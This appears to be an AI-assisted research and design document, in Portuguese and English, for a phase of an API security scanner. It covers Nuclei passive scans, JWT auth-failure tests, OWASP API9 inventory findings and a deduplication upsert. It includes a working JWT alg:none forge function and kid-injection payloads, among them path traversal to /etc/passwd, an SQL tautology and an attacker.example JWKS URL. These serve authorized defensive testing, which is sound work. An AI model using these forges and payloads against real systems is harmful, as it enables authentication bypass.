# Phase 12: Security Testing — Passive - Research

**Researched:** 2026-04-20
**Domain:** Nuclei stateless scanning + JWT/auth-failure in-house TS + OWASP API Top 10 2023 (API2/API8/API9)
**Confidence:** HIGH

<user_constraints>
## User Constraints (from CONTEXT.md)

### Locked Decisions

**Templates Nuclei + API8/API9 scope**
- Tags oficiais estritamente: `-tags misconfig,exposure,graphql,cors` (exatamente o que TEST-01 lista). Sem severity mínima — Nuclei classifica. Sem adição de `tech`/`fingerprint`.
- Granularidade: 1 spawn Nuclei por API. Phase 12 constrói lista `baseUrl + endpoint.path`, passa via stdin/`-l` para Nuclei. Um único child process por API.
- Templates oficiais apenas — reusa `/tmp/nuclei/nuclei-templates` gerenciado pelo `nucleiPreflight.ts` existente. NÃO versiona templates custom.
- **API9 Inventory via query direta em `apis`/`api_endpoints`** (não log scraping):
  - `apis.specUrl IS NOT NULL AND apis.specHash IS NOT NULL` → finding `api9_inventory_2023` severity `medium`, title `"Especificação de API exposta publicamente"`.
  - `apis.apiType='graphql'` com endpoints discovered via spec → finding severity `medium`, title `"GraphQL introspection habilitado em produção"`.
  - `api_endpoints` onde `discoverySources = ['kiterunner']` exclusivo AND `httpxStatus IN (200, 401, 403)` → finding severity `low` por endpoint, title `"Endpoint oculto descoberto por brute-force"`.
  - API9 findings rodam ANTES do Nuclei scan.

**Auth-failure tests (TEST-02 / API2)**
- Implementação in-house TypeScript em `server/services/scanners/api/authFailure.ts`.
- Escopo: apenas endpoints com `requiresAuth=true` E `resolveApiCredential()` retorna cred compatível.
- Cobertura por auth type:
  - JWT alg:none / kid injection / token reuse: somente `bearer_jwt`.
  - API key leakage: `api_key_header` e `api_key_query`.
  - OAuth2 `bearer_jwt` efêmero (Phase 11 mint): fora de escopo.
- 4 vetores:
  1. **JWT alg:none**: re-emite com header `{"alg":"none"}` + signature vazia → se `status < 400`: finding severity `critical`. Evidence `{ jwtAlg: 'none', originalAlg: 'RS256'|... }`.
  2. **kid injection**: substitui `kid` por `../etc/passwd`, `' OR '1'='1`, `http://attacker.com/jwks` → se `status < 400`: finding severity `high`. Evidence `{ kidValue: 'path-traversal-attempted', originalKid: '<mascarado>' }`.
  3. **token reuse**: extrai `exp` via `decodeJwtExp`; se `exp < now()`, faz request com JWT expirado; se `status < 400`: finding severity `high`. JWT opaco/sem exp: skip + log.
  4. **API key leakage**: GET autenticado em até 5 endpoints GET; se string da cred aparece em body: finding severity `high`. Evidence `{ leakedKeyPrefix: 'sk_abc***', leakedInEndpointId: '<uuid>' }` (mascara após char 3).
- NUNCA armazenar token/key completo em evidence. Mascarar em call site (prefix 3 chars + `***`).
- Rate cap auth-failure: max 4 requests por endpoint, 1s delay entre requests.

**Entrypoint + contract + dryRun + preflight**
- 3 superfícies:
  1. Função `runApiPassiveTests(apiId, opts, jobId?): Promise<PassiveTestResult>` em `server/services/journeys/apiPassiveTests.ts`.
  2. Rota interna `POST /api/v1/apis/:id/test/passive` (RBAC `global_administrator` + `operator`).
  3. CLI `server/scripts/runApiPassiveTests.ts --api=<id> [--no-nuclei] [--no-auth-failure] [--dry-run] [--credential=<id>]` + doc `docs/operations/run-api-passive-tests.md`.
- `ApiPassiveTestOpts`:
  ```ts
  {
    stages: {
      nucleiPassive?: boolean;    // default true
      authFailure?: boolean;       // default true
      api9Inventory?: boolean;     // default true
    };
    credentialIdOverride?: string;
    endpointIds?: string[];
    dryRun?: boolean;
    nuclei?: { rateLimit?: number; timeoutSec?: number };  // defaults 10 req/s, 10s
  }
  ```
- `PassiveTestResult`:
  ```ts
  {
    apiId: string;
    stagesRun: Array<'nuclei_passive' | 'auth_failure' | 'api9_inventory'>;
    stagesSkipped: Array<{ stage: string; reason: string }>;
    findingsCreated: number;
    findingsUpdated: number;
    findingsByCategory: Record<string, number>;
    findingsBySeverity: Record<string, number>;
    cancelled: boolean;
    dryRun: boolean;
    durationMs: number;
  }
  ```
- dryRun determinístico com fixtures locais em `server/__tests__/fixtures/api-passive/`:
  - `nuclei-passive-mock.jsonl` — 3-5 findings Nuclei (1 misconfig, 1 exposure, 1 graphql, 1 cors).
  - `jwt-alg-none-response.json`, `jwt-kid-injection-response.json`, `jwt-expired-response.json`, `api-key-leakage-body.json`.
  - Findings dryRun têm título prefixado `[DRY-RUN] `.
- Preflight: reusa `preflightNuclei` existente. Se `ok=false`: skipa `nucleiPassive` + prossegue `authFailure` + `api9Inventory`.
- Defensive defaults: Nuclei `-rl 10 -timeout 10 -retries 0 -silent -jsonl`; timeout total 30 min; `AbortController` + `processTracker.register(jobId, child)`.
- Cancelamento cooperativo: `jobQueue.isJobCancelled(jobId)` antes de cada stage e entre endpoints em `authFailure`.

**Findings dedupe + evidence + remediation + read path**
- Dedupe chave: `(apiEndpointId, owaspCategory, title)`:
  - Exists + `status != 'closed'` → **update** (re-popula evidence, atualiza jobId, preserva status).
  - Exists + `status='closed'` → **cria nova row** (issue reabriu).
  - Não existe → **insert**.
  - Implementação: `upsertApiFindingByKey` em `storage/apiFindings.ts`.
- Evidence Nuclei → `ApiFindingEvidence`:
  - `evidence.request = { method: nuclei.request.method, url: nuclei.matched-at, headers: ..., bodySnippet: slice(0, 8192) }`
  - `evidence.response = { status, headers, bodySnippet: slice(0, 8192) }`
  - `evidence.extractedValues = { matcherName, extractedResults, templateId }`
  - `evidence.context = nuclei.info.description`
- Severity mapping:
  - Nuclei: `info | low | medium | high | critical` → `threatSeverityEnum` (info → low).
  - Auth-failure: alg:none → critical; kid/reuse → high; leakage → high.
  - API9: spec/introspection → medium; hidden endpoint → low.
- Remediation pt-BR: constantes em `shared/apiRemediationTemplates.ts` com entradas para api2/api8/api9 sub-variantes.
- `riskScore`: NULL no Phase 12 (Phase 14 popula).
- Read path `GET /api/v1/api-findings`:
  - Query params: `?apiId`, `?endpointId`, `?owaspCategory`, `?severity`, `?status`, `?jobId`, `?limit` (default 50), `?offset`.
  - Pelo menos um de `apiId`/`endpointId`/`jobId` obrigatório.
  - RBAC: `global_administrator` + `operator` + `readonly_analyst`.
  - Storage: `listApiFindings(filter)`.

### Claude's Discretion

- Nomes exatos de funções internas nos scanners (`runNucleiPassive`, `parseNucleiJsonl`, `forgeJwtAlgNone`, `injectKid`, etc).
- Estrutura interna do `PassiveTestResult` (planner pode adicionar campos sem breaking).
- Formato exato das fixtures mock (planner define shape JSONL/JSON).
- Lista exata de títulos pt-BR para findings API9 (3 variantes: spec exposto, introspection, endpoint oculto).
- Se `api9Inventory` vira stage separada no orchestrator ou função helper chamada antes do loop de endpoints.
- Mensagens pt-BR exatas de erro em rota/CLI.
- Cobertura Nyquist Wave 0: sugestão de 8 testes — nuclei args builder, jsonl→evidence mapper, api9 inventory query, jwt alg:none forge, kid injection payloads, token reuse skip-opaque, api key leakage heuristic, dedupe upsert.
- Se cria `runApiPassiveTests` no mesmo arquivo que `discoverApi` ou separado (sugere separado: `journeys/apiPassiveTests.ts`).
- Exato shape da Zod schema `apiPassiveTestOptsSchema` (onde mora).
- Ordem exata de imports, header de arquivos (segue CONVENTIONS.md).

### Deferred Ideas (OUT OF SCOPE)

- Paralelismo entre APIs em um job (Phase 15).
- Templates Nuclei custom OWASP API-específicos (possível Phase 13).
- Rate limit por-API granular (Phase 15 SAFE-01).
- `riskScore` populado (Phase 14).
- Sanitização formal de `evidence` (redação Authorization/Cookie, PII) — Phase 14 FIND-02.
- Promoção para `threats` table + dedup cross-journey (Phase 14 FIND-03).
- WebSocket events durante execução (Phase 14 FIND-04).
- Retry automático em Nuclei stage falha (melhoria futura).
- Suporte a mais auth types no JWT tests (só `bearer_jwt` hoje).
- API6 Business Flow e API10 Unsafe Consumption (explicitamente fora de v2.0).
- Throttling adaptativo baseado em response time.
- OAuth2 token forjado (alg:none no token mintado).
- Inspeção de JWT em cookies/body além de Authorization header.
- HMAC replay attack (Phase 13 pode absorver).
- API key entropy analysis (adivinháveis).
- Tabela de "dryRun runs" separada (overkill — usa prefix `[DRY-RUN]`).
- Alerting / notification de findings critical (Phase 14 WS + Phase 15).
- Multi-version comparative testing.
</user_constraints>

<phase_requirements>
## Phase Requirements

| ID | Description | Research Support |
|----|-------------|-----------------|
| TEST-01 | System runs Nuclei misconfiguration/exposure/graphql/cors templates without credentials (API8 Misconfiguration + API9 Inventory coverage) | Nuclei CLI spec (§Nuclei Passive Integration), official template categories (§Template Tags & Categories), JSONL streaming parse pattern (§vulnScanner.ts template), NucleiFindingSchema mapping (§Evidence Mapping), API9 DB-derived signals as separate pre-Nuclei stage (§API9 Inventory Signals) |
| TEST-02 | System executes auth-failure tests (JWT `alg: none`, `kid` injection, token reuse, API key leakage in responses) when credentials are provided (API2) | node:crypto base64url + manual JWT forge (§JWT Manipulation), canonical kid payloads (§Kid Injection Payloads), `decodeJwtExp` reuse (§Token Reuse Detection), mask-at-source pattern + 5-endpoint GET probe (§API Key Leakage Detection) |
</phase_requirements>

## Summary

Phase 12 entrega o primeiro batch stateless de testes OWASP API Top 10 2023, combinando um wrapper Nuclei (usando tags oficiais `misconfig,exposure,graphql,cors`) + um módulo in-house TypeScript para auth-failure + geração de findings API9 Inventory via query DB direta. A arquitetura espelha Phase 11 (`apiDiscovery.ts`) mas emite em `api_findings` em vez de `api_endpoints`.

O trabalho técnico de Phase 12 é pequeno no volume mas denso em integrações: reusa `preflightNuclei.ts`, `NucleiFindingSchema` (Zod v1.0), `processTracker`, `jobQueue.isJobCancelled`, `resolveApiCredential`, `getApiCredentialWithSecret`, `decodeJwtExp`, `apiFindingEvidenceSchema` — zero nova dependência npm. JWT manipulation é feita via `Buffer.from(..., 'base64url')` nativo do Node ≥ 20, sem adicionar `jose`/`jsonwebtoken`.

**Primary recommendation:** Construa 3 scanners novos (`nucleiApi.ts`, `authFailure.ts`, `api9Inventory.ts`) + 1 orchestrator (`apiPassiveTests.ts`) + 1 helper storage (`upsertApiFindingByKey`) + 1 read rota (`GET /api/v1/api-findings`) + 1 write rota (`POST /api/v1/apis/:id/test/passive`) + 1 CLI. Dependências: `preflightNuclei` (v1.0), `NucleiFindingSchema` (v1.0), `resolveApiCredential` (Phase 10), `decodeJwtExp` (Phase 10). Nenhuma nova biblioteca; apenas `node:crypto` built-in.

## Standard Stack

### Core

| Library | Version | Purpose | Why Standard |
|---------|---------|---------|--------------|
| `nuclei` (binary) | v3.x (installed) | Stateless template-based scanner | TEST-01 canonical, já em `/tmp/nuclei/nuclei-templates`, wrapper pattern em `vulnScanner.ts::nucleiScanUrl` |
| `node:crypto` (Node ≥ 20) | built-in | Base64url encode/decode para JWT manipulation | Zero nova dep; `Buffer.from(x, 'base64url')` é nativo desde Node 16+ |
| `zod` | 3.24.x (já no projeto) | Parse JSONL Nuclei output + valida opts | `NucleiFindingSchema` já existe em `shared/schema.ts` |
| `drizzle-orm` | 0.45.x (atualizar de 0.39 se necessário — ver Versão Pitfall) | DB upsert + query | `onConflictDoUpdate` com composite key nativo, ver `apiEndpoints.ts` |

### Supporting

| Library | Version | Purpose | When to Use |
|---------|---------|---------|-------------|
| `pino` (via `server/lib/logger.ts`) | já instalado | Logger estruturado com redaction automática | Todos os cenários — redaction paths cobrem `authorization`, `secretEncrypted` |
| `@shared/schema` (workspace alias) | N/A | Reusa `NucleiFindingSchema`, `apiFindingEvidenceSchema`, `ApiFindingEvidence`, `InsertApiFinding` | Phase 12 só usa — não adiciona novas tabelas |

### Alternatives Considered

| Instead of | Could Use | Tradeoff |
|------------|-----------|----------|
| node:crypto manual JWT | `jose@^5.0` ou `jsonwebtoken` | CONTEXT decidiu NÃO adicionar — 150+ LOC de manipulação é trivial com `Buffer.from(x, 'base64url')`, reduz supply-chain surface, JWT forge para alg:none é literalmente concatenar 3 strings |
| Nuclei spawn por endpoint | `-l` file com todos endpoints | Spawn por endpoint = N processes = explosão de work; um único spawn por API batcha stdin/`-l` file com todas URLs, respeitando `-rl 10` global (ver Pitfall 1) |
| Drizzle upsert para dedupe | SELECT→INSERT/UPDATE em transaction | `onConflictDoUpdate` existe em Drizzle 0.39+ com composite key, pattern já usado em `apiEndpoints.ts::upsertApiEndpoints`; transaction manual seria 3x o código |
| Log scraping do Phase 11 para API9 | Query direta em `apis`/`api_endpoints` | CONTEXT lock: acoplamento frágil via logs vs query DB idempotente; Phase 12 é consumidor natural dos sinais já persistidos pelo Phase 11 |

**Installation:**
```bash
# Nenhuma nova dep npm. Verificar versões existentes:
npm view drizzle-orm version   # esperado ≥ 0.39; atual do projeto provavelmente 0.39 (Phase 10)
npm view zod version            # esperado 3.24.x
node --version                  # esperado ≥ 20 (para base64url nativo)
```

**Version verification:** A única "bump" potencial é drizzle-orm 0.39 → 0.45.2 (latest 2026). Phase 12 NÃO requer upgrade — `onConflictDoUpdate` com composite key funciona em 0.39+. Se o projeto ainda está em 0.39, mantenha.

## Architecture Patterns

### Recommended Project Structure

```
server/
├── services/
│   ├── journeys/
│   │   ├── apiDiscovery.ts              # Phase 11 (existente — template)
│   │   ├── apiPassiveTests.ts           # NOVO — orchestrator Phase 12
│   │   └── nucleiPreflight.ts           # v1.0 (reusa SEM mudança)
│   └── scanners/
│       └── api/
│           ├── openapi.ts, graphql.ts, httpx.ts, katana.ts, kiterunner.ts, arjun.ts  # Phase 11
│           ├── preflight.ts             # Phase 11
│           ├── specHash.ts              # Phase 11
│           ├── nucleiApi.ts             # NOVO — wrapper Nuclei com tags passivas
│           ├── authFailure.ts           # NOVO — 4 vetores JWT + leakage
│           └── api9Inventory.ts         # NOVO — queries DB para sinais API9
├── storage/
│   └── apiFindings.ts                    # Phase 9 (estender: upsertApiFindingByKey + listApiFindings)
├── routes/
│   ├── apis.ts                           # Phase 9/11 (estender: POST :id/test/passive)
│   └── apiFindings.ts                   # NOVO — GET /api/v1/api-findings
└── scripts/
    └── runApiPassiveTests.ts             # NOVO — CLI operator
shared/
├── schema.ts                              # estender: apiPassiveTestOptsSchema
└── apiRemediationTemplates.ts             # NOVO — constantes pt-BR
docs/
└── operations/
    └── run-api-passive-tests.md           # NOVO — runbook
server/__tests__/
├── fixtures/
│   └── api-passive/                       # NOVO — 5 fixtures (1 JSONL + 4 JSON)
└── apiPassive/                            # NOVO pasta (espelha apiDiscovery/)
    ├── nucleiArgs.test.ts
    ├── jsonlMapper.test.ts
    ├── api9Inventory.test.ts
    ├── jwtAlgNone.test.ts
    ├── kidInjection.test.ts
    ├── tokenReuse.test.ts
    ├── apiKeyLeakage.test.ts
    ├── dedupeUpsert.test.ts
    ├── orchestrator.test.ts
    └── route.test.ts
```

### Pattern 1: Nuclei Wrapper Reusando Preflight + Spawn Streaming

**What:** Single spawn Nuclei por API, stdin batched URLs, JSONL streaming stdout, `NucleiFindingSchema.safeParse` por linha.

**When to use:** Para `nucleiPassive` stage. Espelha `vulnScanner.ts::nucleiScanUrl` mas com `-tags` em vez de `-u`.

**Example:**
```typescript
// Source: server/services/scanners/vulnScanner.ts:114-158 (pattern template v1.0)
//         server/services/journeys/nucleiPreflight.ts (preflight memoizado)
import { spawn } from 'child_process';
import { processTracker } from '../../processTracker';
import { preflightNuclei } from '../../journeys/nucleiPreflight';
import { NucleiFindingSchema } from '@shared/schema';

export async function runNucleiPassive(
  endpoints: Array<{ id: string; fullUrl: string }>,
  opts: { rateLimit: number; timeoutSec: number },
  ctx: { jobId?: string; signal?: AbortSignal },
): Promise<{ findings: NucleiHit[]; skipped?: { reason: string } }> {
  const preflight = await preflightNuclei(log);
  if (!preflight.ok) return { findings: [], skipped: { reason: preflight.reason ?? 'nuclei unavailable' } };

  const args = [
    '-tags', 'misconfig,exposure,graphql,cors',
    '-jsonl',
    '-silent',
    '-duc', '-ni', '-nc', '-nm',
    '-rl', String(opts.rateLimit),
    '-timeout', String(opts.timeoutSec),
    '-retries', '0',
    '-t', '/tmp/nuclei/nuclei-templates',
    '-l', '/dev/stdin',  // Nuclei aceita stdin via -l /dev/stdin OR raw pipe
  ];

  const child = spawn('nuclei', args, {
    stdio: ['pipe', 'pipe', 'pipe'],
    env: {
      ...process.env,
      HOME: '/tmp/nuclei',
      NUCLEI_CONFIG_DIR: '/tmp/nuclei/.config',
      XDG_CONFIG_HOME: '/tmp/nuclei/.config',
      XDG_CACHE_HOME: '/tmp/nuclei/.cache',
    },
  });

  if (ctx.jobId && child.pid) processTracker.register(ctx.jobId, 'nuclei', child, 'api-passive:nuclei');

  child.stdin?.write(endpoints.map(e => e.fullUrl).join('\n') + '\n');
  child.stdin?.end();

  // Streaming parse — JSONL line-by-line via NucleiFindingSchema.safeParse
  // ...
}
```

### Pattern 2: In-House JWT Forge (alg:none) Sem Dep

**What:** Manipula header + payload via `Buffer.from(..., 'base64url')` nativo. Signature vazia = token alg:none RFC-válido.

**When to use:** Para TEST-02 vetor 1. O forge é literalmente 4 linhas.

**Example:**
```typescript
// Source: https://datatracker.ietf.org/doc/html/rfc7519 (JWT spec)
//         https://nodejs.org/api/buffer.html#buffers-and-character-encodings (base64url native)
export function forgeJwtAlgNone(originalJwt: string): { forged: string; originalAlg: string | null } {
  const parts = originalJwt.split('.');
  if (parts.length < 2) throw new Error('JWT opaco — não pode forjar alg:none');

  const originalHeader = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
  const originalAlg = typeof originalHeader.alg === 'string' ? originalHeader.alg : null;

  const forgedHeader = { ...originalHeader, alg: 'none' };
  const headerB64 = Buffer.from(JSON.stringify(forgedHeader), 'utf8').toString('base64url');
  const payloadB64 = parts[1]; // Reaproveita payload original (não modifica claims — o TESTE é aceitação de alg:none, não privilege escalation)

  // RFC 7519: alg=none → signature é string vazia (parts.length === 3 com 3º vazio).
  // Algumas implementações aceitam também omit do 3º segmento (parts.length === 2).
  // Enviamos variante "three segments" por ser mais amplamente aceita por parsers naive.
  return { forged: `${headerB64}.${payloadB64}.`, originalAlg };
}
```

### Pattern 3: Kid Injection — Canonical Payloads

**What:** Lista estática de payloads de kid injection testando path traversal, SQLi, URL injection, null byte.

**When to use:** TEST-02 vetor 2. Cada payload vira uma request separada (4 tentativas max por endpoint conforme CONTEXT).

**Example:**
```typescript
// Source: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal
//         https://pentesterlab.com/glossary/jwt-kid-injection
export const KID_INJECTION_PAYLOADS: Array<{ label: string; value: string }> = [
  { label: 'path-traversal-dev-null', value: '../../../../../../../dev/null' },
  { label: 'path-traversal-etc-passwd', value: '../../../../../../../etc/passwd' },
  { label: 'sql-injection-tautology', value: "' OR '1'='1" },
  { label: 'url-injection-external-jwks', value: 'http://attacker.example/jwks.json' },
];

export function injectKid(originalJwt: string, payloadValue: string): string {
  const parts = originalJwt.split('.');
  const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
  header.kid = payloadValue;
  const headerB64 = Buffer.from(JSON.stringify(header), 'utf8').toString('base64url');
  // Reutiliza payload + signature originais (ataca via manipulação do kid, não da signature)
  return `${headerB64}.${parts[1]}.${parts[2] ?? ''}`;
}
```

### Pattern 4: Dedupe Upsert com Composite Key (Drizzle)

**What:** `onConflictDoUpdate` com `target: [endpointId, category, title]` — mas `api_findings` atual NÃO tem UNIQUE constraint nessa tripla. Duas opções:

**Option A (preferida — SELECT→UPDATE/INSERT em transaction):**
```typescript
// Source: server/storage/apiEndpoints.ts::upsertApiEndpoint (pattern template Phase 11)
//         https://orm.drizzle.team/docs/guides/upsert
export async function upsertApiFindingByKey(
  endpointId: string,
  category: OwaspApiCategory,
  title: string,
  data: InsertApiFinding,
): Promise<{ finding: ApiFinding; action: 'inserted' | 'updated' }> {
  return await db.transaction(async (tx) => {
    const existing = await tx
      .select()
      .from(apiFindings)
      .where(
        and(
          eq(apiFindings.apiEndpointId, endpointId),
          eq(apiFindings.owaspCategory, category),
          eq(apiFindings.title, title),
          ne(apiFindings.status, 'closed'),
        ),
      )
      .limit(1);

    if (existing.length > 0) {
      // Update path — preserve status; refresh evidence + jobId + updatedAt
      const [updated] = await tx
        .update(apiFindings)
        .set({
          evidence: data.evidence,
          jobId: data.jobId,
          severity: data.severity,
          description: data.description,
          remediation: data.remediation,
          updatedAt: new Date(),
        })
        .where(eq(apiFindings.id, existing[0].id))
        .returning();
      return { finding: updated, action: 'updated' };
    }

    const [created] = await tx.insert(apiFindings).values(data).returning();
    return { finding: created, action: 'inserted' };
  });
}
```

**Option B (adicionar UNIQUE partial index + onConflictDoUpdate):** Aditivo mas muda schema (Phase 9 lock "additive"). A partial index `UNIQUE (endpoint_id, owasp_category, title) WHERE status != 'closed'` seria cleaner mas CONTEXT não menciona schema change — manter Option A.

### Anti-Patterns to Avoid

- **Spawn Nuclei por endpoint:** gera N processos, explode `processTracker`. Single spawn por API com stdin batch é o pattern v1.0.
- **Adicionar `jose`/`jsonwebtoken`:** CONTEXT lock — supply-chain surface desnecessário; `Buffer.from(x, 'base64url')` resolve.
- **Log scraping Phase 11 para API9:** frágil, não idempotente. Query DB direta é ground truth.
- **Dedupe via `template-id` em vez de `title`:** mesma template Nuclei pode gerar títulos diferentes conforme matcher — dedupe por title é determinístico por tipo de finding.
- **Truncar body no meio de codepoint UTF-8:** `.slice(0, 8192)` em JS opera em UTF-16 code units — para multi-byte chars pode cortar mid-codepoint e produzir replacement chars quando serializado em PG. Ver Pitfall 6.
- **Armazenar cred decriptada em evidence:** mascarar EM call site (prefix 3 + `***`). Phase 14 sanitization é defense-in-depth; Phase 12 não confia em downstream.

## Don't Hand-Roll

| Problem | Don't Build | Use Instead | Why |
|---------|-------------|-------------|-----|
| Nuclei binary preflight + templates auto-update | Custom `spawnSync('which', ['nuclei'])` + clone git | `preflightNuclei(log)` em `server/services/journeys/nucleiPreflight.ts` | Já memoizado, já cobre auto-update, já tratado em tests |
| JSONL parse com Zod validation | Manual JSON.parse + manual schema check | `NucleiFindingSchema.safeParse(line)` | v1.0 Parser Foundation (Phase 1) entregou schema completo; strip extra fields + validates |
| Child process + SIGTERM graceful + AbortSignal | Spawn + manual kill logic | `processTracker.register(jobId, 'nuclei', child, stage)` + `processTracker.kill(jobId, pid)` | SIGTERM then SIGKILL após 5s, heartbeat monitoring, shutdown hooks |
| Cancelamento cooperativo | Custom flag passado between stages | `jobQueue.isJobCancelled(jobId)` | Já implementado em `journeyExecutor.ts` — padrão do projeto |
| Credential resolution por URL pattern | Match manual por glob | `storage.resolveApiCredential(apiId, url)` | Phase 10 entregou com tie-breaking por specificity + priority + createdAt |
| JWT exp parsing | Custom decode base64url + JSON parse + Number.isFinite | `decodeJwtExp(jwt)` em `server/services/credentials/decodeJwtExp.ts` | Phase 10 helper — silent-fail completo, cobre opaque/malformed/missing |
| Zod validation de Nuclei output | Schema custom | `NucleiFindingSchema` em `shared/schema.ts` | v1.0 já cobre `matched-at`, `matcher-name`, `extracted-results`, `info.severity`, `classification`, `references` — strip extra |
| Evidence JSONB validation | Check manual de shape | `apiFindingEvidenceSchema` em `shared/schema.ts:1546-1560` | Strict Zod, `bodySnippet` max 8192, reject unknown keys |
| pino redaction de secrets | Log scrubbing custom | `server/lib/logger.ts` pino paths — cobre `secretEncrypted`, `dekEncrypted`, `authorization` | Redaction automática; use `createLogger('journeys:apiPassiveTests')` |

**Key insight:** Phase 12 é **integration-heavy, invention-light**. Quase tudo que parece "I'll need X" já existe em Phase 1/9/10/11 ou node built-ins. O código novo de Phase 12 deve ser ~1,500 LOC concentrados em: orchestrator (~250 LOC), nucleiApi wrapper (~200 LOC), authFailure (~300 LOC de 4 vetores + mask-at-source), api9Inventory (~150 LOC de queries), upsert storage (~80 LOC), rota + CLI + doc (~300 LOC), fixtures + tests (~500 LOC).

## Common Pitfalls

### Pitfall 1: Nuclei `-rl` Semantics — Global Per-Run, Not Per-Host
**What goes wrong:** Assumir que `-rl 10` = 10 QPS por host (caso do kiterunner), esperar 100 QPS total quando 10 hosts.

**Why it happens:** Docs Nuclei ambíguas; testes locais em 1 host mascaram.

**How to avoid:** Docs oficiais confirmam: `-rl` é **global ceiling de requests/segundo em toda a execução** ([docs.projectdiscovery.io](https://docs.projectdiscovery.io/tools/nuclei/running)). Se Phase 15 pretende global 50 QPS, Phase 12 com `-rl 10` é seguro mesmo rodando múltiplas APIs paralelo (não paralelizamos hoje).

**Warning signs:** Target reclamando de rate > configurado; logs Nuclei mostrando "rate-limit 10 req/sec".

### Pitfall 2: Nuclei Stdin Input — Usar `-l /dev/stdin` OR Raw Pipe
**What goes wrong:** Passar URLs via `child.stdin.write()` mas Nuclei não lê sem flag `-l /dev/stdin` OR sem ser o único input (sem `-u`/`-l`).

**Why it happens:** Comportamento implícito de "if no -l and stdin is pipe, read stdin" mudou entre versions de Nuclei; `-no-stdin` existe para DESABILITAR.

**How to avoid:** Use `-l /dev/stdin` explicitamente. Documentação oficial ([docs.projectdiscovery.io/opensource/nuclei/input-formats](https://docs.projectdiscovery.io/opensource/nuclei/input-formats)) confirma suporte; pattern `cat urls.txt | nuclei` funciona mas explicitness evita dependência de stdin inference.

**Warning signs:** Nuclei imprime "No targets given" mesmo com stdin pipe populado; exit 0 sem findings em target conhecido.

### Pitfall 3: Nuclei Exit Code = 0 mesmo sem templates matched
**What goes wrong:** Tratar `code !== 0` como erro genérico, abortar stage em target limpo.

**Why it happens:** Nuclei retorna 0 para "scan completed no matches" E "scan completed com matches"; exit != 0 só em erro fatal (binário não encontrado, argumento inválido).

**How to avoid:** Parse stdout JSONL: `findings.length === 0` = clean target. Log stderr tail para debugging. NÃO abortar pipeline por exit code sozinho.

**Warning signs:** Findings vazios inesperados + stderr mostrando "no templates loaded" ou "context deadline exceeded".

### Pitfall 4: JWT alg:none — Signature Vazia vs Segmento Omitido
**What goes wrong:** Emitir JWT com apenas 2 segmentos (`header.payload`) quando RFC espera 3 (`header.payload.`).

**Why it happens:** RFC 7519 é ambígua — "alg=none → signature octets are empty". Implementations divergem: `jsonwebtoken` aceita ambos; `jose` (mais strict) rejeita 2-segment; parsers naive (string split) podem rejeitar ambos.

**How to avoid:** Emitir **3 segmentos com signature vazia** (`${headerB64}.${payloadB64}.`) — aceitação é mais alta. Se alvo rejeita essa forma, emitir também 2-segment como fallback (incrementa # de requests). Para Phase 12 stateless single-shot, 3-segment é o default.

**Warning signs:** Todos os targets retornando 400 "malformed JWT" — considere emitir ambas variantes se cobertura for insuficiente.

### Pitfall 5: Kid Injection Null Byte — TypeScript String Handling
**What goes wrong:** Usar `\x00` em kid string, bibliotecas de serialização (JSON.stringify) preservam mas HTTP transport layers podem truncar no null byte.

**Why it happens:** JSON permite embedded null (`"\u0000"`); HTTP/1.1 headers não permitem; request body via `fetch` + `JSON.stringify` é safe.

**How to avoid:** O kid está DENTRO do JWT header (JSON), não no HTTP header. Base64url encode preserva null byte. Fetch transporta JWT completo como string base64url no HTTP Authorization — null byte nunca vai para HTTP wire. Safe.

**Warning signs:** Servidor responde 400 "invalid kid" vs 200 — diferencia entre "input válido mas kid inválido" vs "request malformado".

### Pitfall 6: bodySnippet Truncation — UTF-16 Code Unit vs UTF-8 Byte
**What goes wrong:** `body.slice(0, 8192)` corta no meio de codepoint multi-byte (emoji, caracteres latinos acentuados), resulting em replacement character quando armazenado/renderizado.

**Why it happens:** JavaScript `String.prototype.slice` opera em UTF-16 code units. Um único caractere UTF-8 multi-byte pode ocupar 2 code units (surrogate pair). Cortar no meio quebra serialização.

**How to avoid:** Duas abordagens:
1. **Simple (defensivo suficiente para Phase 12):** `const snippet = body.slice(0, 8192)` — PG `jsonb` aceita sem erro; Phase 14 sanitization pode fazer UTF-8 aware truncation.
2. **Correto:** Usar `Buffer.from(body).subarray(0, 8192).toString('utf8')` — TextDecoder com `fatal: false` substitui incomplete sequences por replacement char mas não quebra.

**Recommendation:** Option 1 — Phase 14 FIND-02 é owner da sanitization formal; Phase 12 defensive-by-default.

**Warning signs:** Replacement chars `\ufffd` aparecendo em evidence.bodySnippet; PG logs de jsonb encoding errors (nunca deveria acontecer mas sentinel).

### Pitfall 7: API Key Leakage — False Positives em Echo de Header
**What goes wrong:** API key aparece no response body porque server ecoa request headers (debug mode, error message), gerando false positive "leakage".

**Why it happens:** Alguns frameworks em dev mode retornam request dump em errors; essa NÃO é leakage real (não exporia para OUTRO cliente).

**How to avoid:** Matching substring no body é suficiente para Phase 12 (passive). False positives são aceitáveis conforme CONTEXT "ausência de cred ≠ finding de auth" pattern. Phase 14 sanitization pode futuro-adicionar filtro "se echo do request". Para Phase 12, aceitar false positive; `extractedValues.leakedKeyPrefix` + `leakedInEndpointId` dão evidência suficiente para triagem.

**Alternative defensive pattern:** Só conta leakage se `response.status < 400` (filtra echoes em error pages). CONTEXT implicitly aceita isso em "status < 400" gates. Mantenha.

**Warning signs:** Alta taxa de API key leakage findings em uma API — investigate se é debug mode vs real leakage.

### Pitfall 8: Dedupe Race Condition em Concurrent Jobs
**What goes wrong:** Dois jobs rodam Phase 12 em mesma API simultaneamente; ambos fazem `SELECT` que retorna zero matches, ambos fazem `INSERT` com mesmo `(endpointId, category, title)` → duas rows duplicadas em vez de 1 + 1 update.

**Why it happens:** SELECT→INSERT sem lock row-level OR sem UNIQUE constraint é race-prone em concurrent transactions.

**How to avoid:** Phase 12 CONTEXT decidiu "APIs processadas sequencialmente dentro de um job". Jobs paralelos rodando no mesmo API é edge case (jobQueue serializa normalmente). Mitigação suficiente:
1. `SELECT ... FOR UPDATE` dentro da transaction (row-level lock em rows existentes — mas não previne 2 INSERTS concorrentes em rows inexistentes).
2. Usar Postgres advisory lock por `apiId`: `SELECT pg_advisory_xact_lock(hashtext(apiId))` no início da transaction.
3. Adicionar partial UNIQUE index (Option B acima) — schema change, evitar.

**Recommendation:** Advisory lock por `apiId` em `upsertApiFindingByKey`. Adiciona 1 linha, cobre race.

**Warning signs:** Logs mostrando dois findings idênticos criados em milisegundos de diferença.

